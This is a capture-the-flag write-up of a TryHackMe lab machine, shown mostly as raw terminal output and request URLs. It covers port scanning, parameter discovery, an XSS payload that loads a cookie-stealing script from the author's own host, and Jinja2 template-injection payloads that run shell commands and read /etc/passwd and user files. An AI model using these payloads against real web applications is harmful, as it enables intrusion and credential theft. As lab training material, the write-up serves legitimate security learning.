# Theseus — Writeup

## Overview
### Theseus — Writeup
### Theseus — Writeup
----
The first installment of the SuitGuy series of very hard challenges.
----
![](https://tryhackme-images.s3.amazonaws.com/room-icons/9c87676bf415d0fa4f7dfad790b8ba51.jpeg)
Start Machine
Can you follow the path of Theseus and survive the trials of the Labyrinth?
Please don't release any walk-through or write-ups for this room to keep the challenge valuable for all who complete the Labyrinth.
Answer the questions below

## Enumeration
```text
┌──(witty㉿kali)-[~/Downloads]
└─$ ping 10.10.57.61            
PING 10.10.57.61 (10.10.57.61) 56(84) bytes of data.
64 bytes from 10.10.57.61: icmp_seq=1 ttl=63 time=193 ms
64 bytes from 10.10.57.61: icmp_seq=2 ttl=63 time=187 ms
^C
--- 10.10.57.61 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 187.194/190.193/193.193/2.999 ms
                                                                                                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.57.61 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.57.61:22
Open 10.10.57.61:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.57.61 [2 ports]
Discovered open port 22/tcp on 10.10.57.61
Discovered open port 8080/tcp on 10.10.57.61
Completed Connect Scan (2 total ports)
Initiating Service scan
Scanning 2 services on 10.10.57.61
Completed Service scan (2 services on 1 host)
NSE: Script scanning 10.10.57.61.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.57.61
Host is up, received user-set (0.19s latency).

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87c426884f42ae2c748bff662df0689d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCz+HeNp9l/BIOcQooT/LeuPI0QdNtru49hzUMhdEZDwSMxsx6Ppjz62eLWn7kxziSQN1SjzfP9/FiEfT/8JiORFO5Lcqpd7NTTmNykKImIeCYbNQglFn4oXJA/YU6PCMLXlqV7JIUHKwyobAz36wlrnAC6ngTrzwhkv4mdiFwKtLtRD5bimyO7PIRKy8Diu/Bwm85AmXEet+jCw2D+Mh8mdzAVZ9TgChsld5l9MqtKzjV+Rh2qzL2RfXl6EcVObSOTeXcXL9qbTNp6zIyuILOyHmVg9fFeUWHlkT0kpOXNkJSw4OV2ewzx+m2j7Kd/LW7L6EV8WuoCIhUHL+KxtxO7
|   256 05f506fcdc86f8f2bae2eedf14c33de4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIkRuZaOKjEeXbbFf0lK9iGbg2r2Kh2TVAYuPZlrwpAyuA1x7TW2z/CWVR1ug1qQ716dQq3JszyliVP3mc4lD9o=
|   256 9274cb39e1ce3190139d4cee27f806bc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK2IMzlmBlnHUMxet+ujPGmrV/I0eISqyTR5seIZrzBk
8080/tcp open  http    syn-ack Werkzeug httpd 1.0.1 (Python 2.7.17)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.60 seconds

http://10.10.57.61:8080/

On the bottom of the letter was a message Theseus didn't
		quite understand: 
	        TGUE?O·S·K·MTUEGI·SYENFE·TOI···SRO·T·SF·OYT···O·T·KUMH·I·AE·NMK··	

https://www.dcode.fr/scytale-cipher

TO·GET·TO·KING·MINOS·YOU·MUST·FIRST·MAKE·USE·OF·THE·?KEY·········

┌──(witty㉿kali)-[~/Downloads]
└─$ arjun -u http://10.10.238.128:8080
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: key, based on: body length
[+] Parameters found: key

http://10.10.238.128:8080/?key=hi

http://10.10.238.128:8080/?key=%3Cscript%3Ealert(window.origin)%3C/script%3E

http://10.10.238.128:8080/?key=%3Cscript%3Ealert(document.domain.concat(%22\n%22).concat(window.origin))%3C/script%3E

┌──(witty㉿kali)-[~]
└─$ cat xss.js                                        
var req = new XMLHttpRequest();
req.open("GET", "http://10.10.238.128:8080/?key=" + document.cookie, false);
req.send();

http://10.10.238.128:8080/?key=%3Cscript%20src=%22http://10.8.19.103/xss.js%22%3E%3C/script%3E

┌──(witty㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.8.19.103 - - [02/Jul/2023 12:40:50] "GET /xss.js HTTP/1.1" 200 -

http://10.10.238.128:8080/?key=%3Cscript%3Edebugger;%3C/script%3E

is SSTI (I thought SSRF)

http://10.10.238.128:8080/?key={{7*7}}

49

http://10.10.238.128:8080/?key={{config.items()}}

[('JSON_AS_ASCII', True), ('USE_X_SENDFILE', False), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_NAME', 'session'), ('MAX_COOKIE_SIZE', 4093), ('SESSION_COOKIE_SAMESITE', None), ('PROPAGATE_EXCEPTIONS', None), ('ENV', 'production'), ('DEBUG', False), ('SECRET_KEY', None), ('EXPLAIN_TEMPLATE_LOADING', False), ('MAX_CONTENT_LENGTH', None), ('APPLICATION_ROOT', '/'), ('SERVER_NAME', None), ('PREFERRED_URL_SCHEME', 'http'), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('TESTING', False), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('TEMPLATES_AUTO_RELOAD', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('JSON_SORT_KEYS', True), ('JSONIFY_MIMETYPE', 'application/json'), ('SESSION_COOKIE_HTTPONLY', True), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200)), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('TRAP_HTTP_EXCEPTIONS', False)]

http://10.10.238.128:8080/?key={{%20%27%27.__class__.__mro__[2].__subclasses__()%20}}

[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'string.Template'>, <class 'string.Formatter'>, <type 'collections.deque'>, <type 'deque_iterator'>, <type 'deque_reverse_iterator'>, <type 'operator.itemgetter'>, <type 'operator.attrgetter'>, <type 'operator.methodcaller'>, <type 'itertools.combinations'>, <type 'itertools.combinations_with_replacement'>, <type 'itertools.cycle'>, <type 'itertools.dropwhile'>, <type 'itertools.takewhile'>, <type 'itertools.islice'>, <type 'itertools.starmap'>, <type 'itertools.imap'>, <type 'itertools.chain'>, <type 'itertools.compress'>, <type 'itertools.ifilter'>, <type 'itertools.ifilterfalse'>, <type 'itertools.count'>, <type 'itertools.izip'>, <type 'itertools.izip_longest'>, <type 'itertools.permutations'>, <type 'itertools.product'>, <type 'itertools.repeat'>, <type 'itertools.groupby'>, <type 'itertools.tee_dataobject'>, <type 'itertools.tee'>, <type 'itertools._grouper'>, <type '_thread._localdummy'>, <type 'thread._local'>, <type 'thread.lock'>, <type 'method_descriptor'>, <class 'markupsafe._MarkupEscapeHelper'>, <type '_io._IOBase'>, <type '_io.IncrementalNewlineDecoder'>, <type '_hashlib.HASH'>, <type '_random.Random'>, <type 'cStringIO.StringO'>, <type 'cStringIO.StringI'>, <type 'cPickle.Unpickler'>, <type 'cPickle.Pickler'>, <type 'functools.partial'>, <type '_ssl._SSLContext'>, <type '_ssl._SSLSocket'>, <class 'socket._closedsocket'>, <type '_socket.socket'>, <class 'socket._socketobject'>, <class 'socket._fileobject'>, <type 'time.struct_time'>, <type 'Struct'>, <class 'urlparse.ResultMixin'>, <class 'contextlib.GeneratorContextManager'>, <class 'contextlib.closing'>, <type '_json.Scanner'>, <type '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'threading._Verbose'>, <class 'jinja2.utils.MissingType'>, <class 'jinja2.utils.LRUCache'>, <class 'jinja2.utils.Cycler'>, <class 'jinja2.utils.Joiner'>, <class 'jinja2.utils.Namespace'>, <class 'jinja2.bccache.Bucket'>, <class 'jinja2.bccache.BytecodeCache'>, <class 'jinja2.nodes.EvalContext'>, <class 'jinja2.visitor.NodeVisitor'>, <class 'jinja2.nodes.Node'>, <class 'jinja2.idtracking.Symbols'>, <class 'jinja2.compiler.MacroRef'>, <class 'jinja2.compiler.Frame'>, <class 'jinja2.runtime.TemplateReference'>, <class 'numbers.Number'>, <class 'jinja2.runtime.Context'>, <class 'jinja2.runtime.BlockReference'>, <class 'jinja2.runtime.Macro'>, <class 'jinja2.runtime.Undefined'>, <class 'decimal.Decimal'>, <class 'decimal._ContextManager'>, <class 'decimal.Context'>, <class 'decimal._WorkRep'>, <class 'decimal._Log10Memoize'>, <type '_ast.AST'>, <class 'ast.NodeVisitor'>, <class 'jinja2.lexer.Failure'>, <class 'jinja2.lexer.TokenStreamIterator'>, <class 'jinja2.lexer.TokenStream'>, <class 'jinja2.lexer.Lexer'>, <class 'jinja2.parser.Parser'>, <class 'jinja2.environment.Environment'>, <class 'jinja2.environment.Template'>, <class 'jinja2.environment.TemplateModule'>, <class 'jinja2.environment.TemplateExpression'>, <class 'jinja2.environment.TemplateStream'>, <class 'jinja2.loaders.BaseLoader'>, <type 'datetime.date'>, <type 'datetime.timedelta'>, <type 'datetime.time'>, <type 'datetime.tzinfo'>, <class 'logging.LogRecord'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'werkzeug._internal._Missing'>, <class 'werkzeug._internal._DictAccessorProperty'>, <class 'werkzeug.utils.HTMLBuilder'>, <class 'werkzeug.exceptions.Aborter'>, <class 'werkzeug.urls.Href'>, <type 'select.epoll'>, <class 'click._compat._FixupStream'>, <class 'click._compat._AtomicFile'>, <class 'click.utils.LazyFile'>, <class 'click.utils.KeepOpenFile'>, <class 'click.utils.PacifyFlushWrapper'>, <class 'click.parser.Option'>, <class 'click.parser.Argument'>, <class 'click.parser.ParsingState'>, <class 'click.parser.OptionParser'>, <class 'click.types.ParamType'>, <class 'click.formatting.HelpFormatter'>, <class 'click.core.Context'>, <class 'click.core.BaseCommand'>, <class 'click.core.Parameter'>, <class 'werkzeug.serving.WSGIRequestHandler'>, <class 'werkzeug.serving._SSLContext'>, <class 'werkzeug.serving.BaseWSGIServer'>, <class 'werkzeug.datastructures.ImmutableListMixin'>, <class 'werkzeug.datastructures.ImmutableDictMixin'>, <class 'werkzeug.datastructures.UpdateDictMixin'>, <class 'werkzeug.datastructures.ViewItems'>, <class 'werkzeug.datastructures._omd_bucket'>, <class 'werkzeug.datastructures.Headers'>, <class 'werkzeug.datastructures.ImmutableHeadersMixin'>, <class 'werkzeug.datastructures.IfRange'>, <class 'werkzeug.datastructures.Range'>, <class 'werkzeug.datastructures.ContentRange'>, <class 'werkzeug.datastructures.FileStorage'>, <class 'email.LazyImporter'>, <class 'calendar.Calendar'>, <class 'werkzeug.wrappers.accept.AcceptMixin'>, <class 'werkzeug.wrappers.auth.AuthorizationMixin'>, <class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, <class 'werkzeug.wsgi.ClosingIterator'>, <class 'werkzeug.wsgi.FileWrapper'>, <class 'werkzeug.wsgi._RangeWrapper'>, <class 'werkzeug.formparser.FormDataParser'>, <class 'werkzeug.formparser.MultiPartParser'>, <class 'werkzeug.wrappers.base_request.BaseRequest'>, <class 'werkzeug.wrappers.base_response.BaseResponse'>, <class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, <class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, <class 'werkzeug.wrappers.etag.ETagRequestMixin'>, <class 'werkzeug.wrappers.etag.ETagResponseMixin'>, <class 'werkzeug.wrappers.cors.CORSRequestMixin'>, <class 'werkzeug.wrappers.cors.CORSResponseMixin'>, <class 'werkzeug.useragents.UserAgentParser'>, <class 'werkzeug.useragents.UserAgent'>, <class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, <class 'werkzeug.wrappers.request.StreamOnlyMixin'>, <class 'werkzeug.wrappers.response.ResponseStream'>, <class 'werkzeug.wrappers.response.ResponseStreamMixin'>, <class 'werkzeug.test._TestCookieHeaders'>, <class 'werkzeug.test._TestCookieResponse'>, <class 'werkzeug.test.EnvironBuilder'>, <class 'werkzeug.test.Client'>, <class 'uuid.UUID'>, <type 'CArgObject'>, <type '_ctypes.CThunkObject'>, <type '_ctypes._CData'>, <type '_ctypes.CField'>, <type '_ctypes.DictRemover'>, <class 'ctypes.CDLL'>, <class 'ctypes.LibraryLoader'>, <class 'subprocess.Popen'>, <class 'itsdangerous._json._CompactJSON'>, <class 'itsdangerous.signer.SigningAlgorithm'>, <class 'itsdangerous.signer.Signer'>, <class 'itsdangerous.serializer.Serializer'>, <class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, <class 'flask._compat._DeprecatedBool'>, <class 'werkzeug.local.Local'>, <class 'werkzeug.local.LocalStack'>, <class 'werkzeug.local.LocalManager'>, <class 'werkzeug.local.LocalProxy'>, <class 'difflib.HtmlDiff'>, <class 'werkzeug.routing.RuleFactory'>, <class 'werkzeug.routing.RuleTemplate'>, <class 'werkzeug.routing.BaseConverter'>, <class 'werkzeug.routing.Map'>, <class 'werkzeug.routing.MapAdapter'>, <class 'flask.signals.Namespace'>, <class 'flask.signals._FakeSignal'>, <class 'flask.helpers.locked_cached_property'>, <class 'flask.helpers._PackageBoundObject'>, <class 'flask.cli.DispatchingApp'>, <class 'flask.cli.ScriptInfo'>, <class 'flask.config.ConfigAttribute'>, <class 'flask.ctx._AppCtxGlobals'>, <class 'flask.ctx.AppContext'>, <class 'flask.ctx.RequestContext'>, <class 'flask.json.tag.JSONTag'>, <class 'flask.json.tag.TaggedJSONSerializer'>, <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <type 'unicodedata.UCD'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>, <type 'method-wrapper'>, <type 'array.array'>]

http://10.10.238.128:8080/?key={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()}}

uid=1001(minos) gid=1001(minos) groups=1001(minos) 

http://10.10.238.128:8080/?key={{%20%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read()%20}}

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false minos:x:1001:1001:,,,:/home/minos:/bin/bash 

http://10.10.238.128:8080/?key={{%20%27%27.__class__.__mro__[2].__subclasses__()[40](%27/etc/hosts%27).read()%20}}

127.0.0.1 localhost # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters ff02::3 ip6-allhosts 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27ls%27).read()}}

bin boot dev etc home lib lib64 media mnt opt proc root run sbin snap srv sys tmp usr var 

10.10.238.128:8080/?key={{config.__class__.__init__.__globals__['os'].popen('ls /home/minos').read()}}

Crete_Shores Minos_Flag 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/home/minos/Minos_Flag%27).read()}}

THM{499a89a2a064426921732e7d31bc08a} 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/home/minos/Crete_Shores%27).read()}}

Theseus insisted he knew the dangers but would succeed in his journey to Crete. As the ship left the harbour wall he shouted to his father King Aegeus "and you will be proud of your son". "Then I wish you luck, my son, I shall watch for you every day. If you are successful, take down these black sails and replace them with white ones. That way I will know you are coming safe to me." As the ship docked in Crete, King Minos himself came down to inspect the prisoners from Athens. He enjoyed the chance to taunt the Athenians and to humiliate them even further. As King Minos jeered as to who would enter the labyrinth first, Theseus stepped forward. "I will go first. I am Theseus, Prince of Athens, and I do not fear what is within the walls of your maze." "Those are brave words for one so young and feeble, but the Minotaur will soon have you between its horns. Guards, open the labyrinth and let him in!" Username: entrance Password: Knossos 

 Username: entrance Password: Knossos 

uhmm not work ssh or maybe 

┌──(witty㉿kali)-[~]
└─$ ssh entrance@10.10.238.128 
entrance@10.10.238.128's password: 
Permission denied, please try again.
entrance@10.10.238.128's password: 

total 16K drwxr-xr-x 6 minos minos 13 Aug 20 2020 . drwxr-xr-x 3 minos minos 3 Aug 3 2020 .. drwxr-xr-x 5 minos minos 6 Aug 3 2020 .Website lrwxrwxrwx 1 minos minos 9 Aug 3 2020 .bash_history -> /dev/null -rw-r--r-- 1 minos minos 220 Aug 3 2020 .bash_logout -rw-r--r-- 1 minos minos 3.7K Aug 3 2020 .bashrc drwx------ 2 minos minos 3 Aug 3 2020 .cache drwx------ 3 minos minos 3 Aug 3 2020 .gnupg -rw-r--r-- 1 minos minos 807 Aug 3 2020 .profile drwx------ 2 minos minos 3 Aug 4 2020 .ssh -rw------- 1 minos minos 6.9K Aug 20 2020 .viminfo -rw-r--r-- 1 minos minos 960 Aug 20 2020 Crete_Shores -rw-r--r-- 1 minos minos 37 Aug 3 2020 Minos_Flag 

http://10.10.238.128:8080/?key={{config.__class__.__init__.__globals__[%27os%27].popen(%27cat%20/home/minos/.viminfo%27).read()}}
```
```text
# This viminfo file was generated by Vim 8.0. # You may edit it if you're careful! # Viminfo version |1,4 # Value of 'encoding' when this file was written *encoding=utf-8 # hlsearch on (H) or off (h): ~h # Command Line History (newest to oldest): :wq |2,0,1597927386,,"wq" :q! |2,0,1596490642,,"q!" :wq! |2,0,1596490636,,"wq!" # Search String History (newest to oldest): # Expression History (newest to oldest): # Input Line History (newest to oldest): # Debug Line History (newest to oldest): # Registers: ""1 LINE 0 and let him in!" |3,1,1,1,1,0,1597927381,"and let him in!\"" "2 LINE 0 between its horns. Guards, open the labyrinth |3,0,2,1,1,0,1597927381,"between its horns. Guards, open the labyrinth" "3 LINE 0 feeble. But the Minotaur will soon have you |3,0,3,1,1,0,1597927380,"feeble. But the Minotaur will soon have you" "4 LINE 0 "Those are brave words for one so young and |3,0,4,1,1,0,1597927380,"\"Those are brave words for one so young and " "5 LINE 0 |3,0,5,1,1,0,1597927380,"" "6 LINE 0 your maze." |3,0,6,1,1,0,1597927379,"your maze.\"" "7 LINE 0 and I do not fear what is within the walls of |3,0,7,1,1,0,1597927378,"and I do not fear what is within the walls of" "8 LINE 0 "I will go first. I am Theseus, Prince of Athens, |3,0,8,1,1,0,1597927378,"\"I will go first. I am Theseus, Prince of Athens," "9 LINE 0 |3,0,9,1,1,0,1597927378,"" "- CHAR 0 |3,0,36,0,1,0,1596491094," " # File marks: '0 1 0 ~/Crete_Shores |4,48,1,0,1597927386,"~/Crete_Shores" '1 7 1 ~/.Website/templates/index.html |4,49,7,1,1597927346,"~/.Website/templates/index.html" '2 35 0 ~/.Website/templates/index.html |4,50,35,0,1596491096,"~/.Website/templates/index.html" '3 35 0 ~/.Website/templates/index.html |4,51,35,0,1596491096,"~/.Website/templates/index.html" '4 35 7 ~/.Website/templates/index.html |4,52,35,7,1596490877,"~/.Website/templates/index.html" '5 35 7 ~/.Website/templates/index.html |4,53,35,7,1596490877,"~/.Website/templates/index.html" '6 35 7 ~/.Website/templates/index.html |4,54,35,7,1596490863,"~/.Website/templates/index.html" '7 35 7 ~/.Website/templates/index.html |4,55,35,7,1596490863,"~/.Website/templates/index.html" '8 35 7 ~/.Website/templates/index.html |4,56,35,7,1596490863,"~/.Website/templates/index.html" '9 35 7 ~/.Website/templates/index.html |4,57,35,7,1596490863,"~/.Website/templates/index.html" # Jumplist (newest first): -' 1 0 ~/Crete_Shores |4,39,1,0,1597927386,"~/Crete_Shores" -' 7 1 ~/.Website/templates/index.html |4,39,7,1,1597927346,"~/.Website/templates/index.html" -' 7 1 ~/.Website/templates/index.html |4,39,7,1,1597927346,"~/.Website/templates/index.html" -' 35 0 ~/.Website/templates/index.html |4,39,35,0,1597927283,"~/.Website/templates/index.html" -' 35 0 ~/.Website/templates/index.html |4,39,35,0,1597927283,"~/.Website/templates/index.html" -' 35 0 ~/.Website/templates/index.html |4,39,35,0,1596491096,"~/.Website/templates/index.html" -' 35 0 ~/.Website/templates/index.html |4,39,35,0,1596491096,"~/.Website/templates/index.html" -' 35 7 ~/.Website/templates/index.html |4,39,35,7,1596490877,"~/.Website/templates/index.html" -' 35 7 ~/.Website/templates/index.html |4,39,35,7,1596490877,"~/.Website/templates/index.html" -' 35 7 ~/.Website/templates/index.html |4,39,35,7,1596490863,"~/.Website/templates/index.html" -' 35 7 ~/.Website/templates/index.html |4,39,35,7,1596490863,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490730,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490711,"~/.Website/templates/index.html" -' 33 8 ~/.Website/templates/index.html |4,39,33,8,1596490711,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 34 1 ~/.Website/templates/index.html |4,39,34,1,1596490642,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html |4,39,1,0,1596490626,"~/.Website/templates/index.html" -' 1 0 ~/.Website/templates/index.html 